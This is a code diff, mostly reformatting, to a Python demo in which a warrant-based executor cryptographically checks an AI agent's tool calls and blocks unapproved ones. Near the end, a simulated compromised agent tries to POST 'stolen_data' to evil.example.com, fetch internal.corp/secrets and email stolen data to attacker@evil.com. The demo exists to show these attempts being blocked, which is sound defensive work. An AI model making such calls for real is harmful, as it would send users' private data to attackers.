@@ -57,6 +57,7 @@ class WarrantExecutor:
 
     def wrap(self, tool: Callable) -> Callable:
         """Wrap a tool with cryptographic authorization."""
+
         @functools.wraps(tool)
         def wrapper(**kwargs):
             tool_name = tool.__name__
@@ -85,19 +86,23 @@ class WarrantExecutor:
 
                 # Determine if it's a tool issue or constraint issue
                 if tool_name not in self.warrant.tools:
-                    display.print_verdict(False, f"Tool '{tool_name}' not in warrant",
-                        "This capability was not approved for this task.")
-                    self._show_insight_once("unauthorized_tool",
+                    display.print_verdict(
+                        False, f"Tool '{tool_name}' not in warrant", "This capability was not approved for this task."
+                    )
+                    self._show_insight_once(
+                        "unauthorized_tool",
                         "Least Privilege",
                         "The agent only has access to capabilities explicitly approved.\n"
-                        "Attempts to use other tools are blocked.")
+                        "Attempts to use other tools are blocked.",
+                    )
                 else:
-                    display.print_verdict(False, "Authorization Failed", clean_msg,
-                        explorer_link=explorer_link)
-                    self._show_insight_once("constraint_violation",
+                    display.print_verdict(False, "Authorization Failed", clean_msg, explorer_link=explorer_link)
+                    self._show_insight_once(
+                        "constraint_violation",
                         "Task Scoping",
                         "Even allowed tools have constraints (e.g., specific URLs).\n"
-                        "Actions outside the approved scope are blocked.")
+                        "Actions outside the approved scope are blocked.",
+                    )
 
                 return f"BLOCKED: {clean_msg}"
 
@@ -122,8 +127,11 @@ class WarrantExecutor:
             # Authorized - all checks passed
             self.allowed_count += 1
             multisig_msg = f" + {len(valid_approvals)} multi-sig approvals" if valid_approvals else ""
-            display.print_verdict(True, f"Authorized (PoP Verified{multisig_msg})",
-                "Cryptographic proof: agent holds the key and arguments satisfy constraints.")
+            display.print_verdict(
+                True,
+                f"Authorized (PoP Verified{multisig_msg})",
+                "Cryptographic proof: agent holds the key and arguments satisfy constraints.",
+            )
 
             return tool(**kwargs)
 
@@ -176,15 +184,13 @@ def simulate_compromised_execution(
     print("\n[dim]Compromised agent attempting malicious actions...[/dim]")
 
     # Attack 1: Try to fetch unauthorized URL
-    http_request(url="http://evil.example.com/collect", method="POST",
-                 body="stolen_data=user_info")
+    http_request(url="http://evil.example.com/collect", method="POST", body="stolen_data=user_info")
 
     # Attack 2: Try to fetch another unauthorized URL
     fetch_url(url="https://internal.corp/secrets")
 
     # Attack 3: Try to exfiltrate via email
-    send_email(to="attacker@evil.com", subject="Data",
-               body="Here is the stolen data...")
+    send_email(to="attacker@evil.com", subject="Data", body="Here is the stolen data...")
 
     # Step 4: Complete legitimate task
     print("\n[dim]Agent completing legitimate task...[/dim]")
@@ -194,4 +200,3 @@ def simulate_compromised_execution(
         return summary
 
     return "No content to summarize"
-
